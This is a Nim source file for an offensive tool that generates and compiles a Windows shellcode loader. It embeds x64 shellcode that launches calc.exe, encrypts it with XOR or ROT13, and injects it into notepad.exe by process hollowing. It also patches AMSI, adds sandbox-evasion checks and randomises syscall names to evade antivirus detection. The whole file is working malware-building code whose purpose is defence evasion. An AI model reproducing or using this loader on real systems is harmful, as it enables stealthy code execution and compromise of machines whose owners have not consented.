import std/strformat, std/strutils, std/sequtils
import injectors/process_hollowing
import crypters/[xorcrypt, caesar]
import amsi/patch 
import sandbox_evasion/sleeptime
import sandbox_evasion/rareapi
import argparse
import random

let shellcode: seq[byte] = @[
    byte 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c,
    0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
    0x32, 0x5c, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00] 

var p = newParser:
    flag("-r", "--release", help="Strip comments and echo statements from generated source file")
    flag("--no-amsi", help="Do not patch AMSI")
    flag("--no-cleanup", help="Do not delete generated .nim-source files after execution")

proc choice_multi(prompt: string, options: seq[string]): seq[string] =
    echo fmt"[*] {prompt} (choose one to multiple, e.g. 1,2,4 or 0 for none):"
    echo fmt"0: None"
    for i, o in options:
        echo fmt"{i+1}: {o}"
    let choices = stdin.readLine().split(',')
    for c in choices:
        if parseInt(c) == 0:
            return @[]
        result.add(options[parseInt(c)-1])
    
proc choice_single(prompt: string, options: seq[string]): string =
    echo fmt"[*] {prompt} (choose one):"
    for i, o in options:
        echo fmt"{i}: {o}"
    let choice = stdin.readLine()
    return options[parseInt(choice)]

proc rand_str(): string =
  for _ in .. 10:
    add(result, char(rand(int('a') .. int('z'))))

when isMainModule:
    try:
        echo """
███▄▄▄▄    ▄█    ▄▄▄▄███▄▄▄▄        ▄█    ▄████████  ▄████████  ▀█████████▄ 
███▀▀▀██▄ ███  ▄██▀▀▀███▀▀▀██▄     ███   ███    █▀  ███    █▀     ▀███▀▀██ 
███   ███ ███▌ ███   ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ 
███   ███ ███▌ ███   ███   ███     ███ ▀▀███▀▀▀     ███            ███     
███   ███ ███  ███   ███   ███     ███   ███    █▄  ███    █▄      ███     
 ▀█   █▀  █▀    ▀█   ███   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀   
                               ▀▀▀▀▀▀                                                      
        """
        let 
            opts = p.parse()
            patch_amsi = not opts.no_amsi
            cleanup = not opts.no_cleanup
            encryptor = choice_single("Choose an encryptor", @["XOR", "ROT13"])
            injector  = choice_single("Choose a process injection method", @["ProcessHollowing"])
            sandbox_ev = choice_multi("Choose sandbox evasion methods", @["Sleep time check", "Rare emulated API"])
        
        echo "[*] Generating nim source code..."

        var stub = dedent """
            import winim
            import syscalls_random
            import dynlib
            import osproc
            import std/strformat, std/times
        """

        if patch_amsi:
            stub = stub & patch.get_stub()

        case encryptor
        of "XOR":
            echo "[*] Enter a secretkey: "
            let secret = stdin.readLine()
            stub = stub & "\n" & xorcrypt.get_stub(shellcode, secret)
        of "ROT13":
            stub = stub & "\n" & caesar.get_stub(shellcode)
        else: 
            echo fmt"[!] Encryptor '{encryptor}' not implemented..."
            quit(1)

        case injector
        of "ProcessHollowing":
            stub = stub & process_hollowing.get_stub(process="notepad.exe")
        else: 
            echo fmt"[!] Injector '{injector}' not implemented..."
            quit(1)

        for ev in sandbox_ev:
            case ev
            of "Sleep time check": stub = stub & sleeptime.get_stub()
            of "Rare emulated API": stub = stub & rareapi.get_stub()
            else: echo fmt"[!] SandboxEvasion '{ev}' not implemented..."; quit(1)

        echo "[*] Psshh... adding syswhispers..."
        echo "[ ] Re-randomising syscalls names"
        var syswhispers = readFile("syscalls.nim")
        # NtWriteVirtualMemory -> yzmpCLbhOKBHjaoy
        var fname = rand_str()
        syswhispers = syswhispers.replace("yzmpCLbhOKBHjaoy", fname)
        stub = stub.replace("NtWriteVirtualMemory", fname)
        echo fmt"    NtWriteVirtualMemory -> {fname}"
        # NtAllocateVirtualMemory -> yPILJShCudQMOxog
        fname = rand_str()
        syswhispers = syswhispers.replace("yPILJShCudQMOxog", fname)
        stub = stub.replace("NtAllocateVirtualMemory", fname)
        echo fmt"    NtAllocateVirtualMemory -> {fname}"
        # NtOpenProcess -> PMRVNVqbGwJwfoaL
        fname = rand_str()
        syswhispers = syswhispers.replace("PMRVNVqbGwJwfoaL", fname)
        stub = stub.replace("NtOpenProcess", fname)
        echo fmt"    NtOpenProcess -> {fname}"
        # NtCreateThreadEx -> kqUfjaYNPYurYxph
        fname = rand_str()
        syswhispers = syswhispers.replace("kqUfjaYNPYurYxph", fname)
        stub = stub.replace("NtCreateThreadEx", fname)
        echo fmt"    NtCreateThreadEx -> {fname}"
        # NtClose -> MvFGBfUiXTPxqVnp
        fname = rand_str()
        syswhispers = syswhispers.replace("MvFGBfUiXTPxqVnp", fname)
        stub = stub.replace("NtClose", fname)
        echo fmt"    NtClose -> {fname}"

        echo "[*] Writing to syscalls_random.nim"
        writeFile("syscalls_random.nim", syswhispers)

        stub = stub & "\n" & dedent """
            when isMainModule:
                inject(shellcode)
        """

        if opts.release:
            echo "[*] Stripping echo statements"
            var clean = ""
            for line in stub.split("\n"):
                if line.strip().startsWith("echo"):
                    continue    
                clean = clean & line & "\n"

            writeFile("out.nim", clean)
        else:
            writeFile("out.nim", stub)

        echo "[*] Compiling executable..."
        var ret = execShellCmd "nim c -d:danger -d:release --opt:size out.nim "
        if ret == 0:
            echo "[*] Done! written to out.exe"
        else:
            echo "[!] Error compiling"

        if cleanup:
            echo "[*] Cleaning up..."
            discard execShellCmd "rm syscalls_random.nim"
            discard execShellCmd "rm stub.nim"

    except ShortCircuit as e:
        if e.flag == "argparse_help":
            echo p.help
        quit(1)

    except UsageError:
        echo p.help
        echo getCurrentExceptionMsg()
        quit(1)
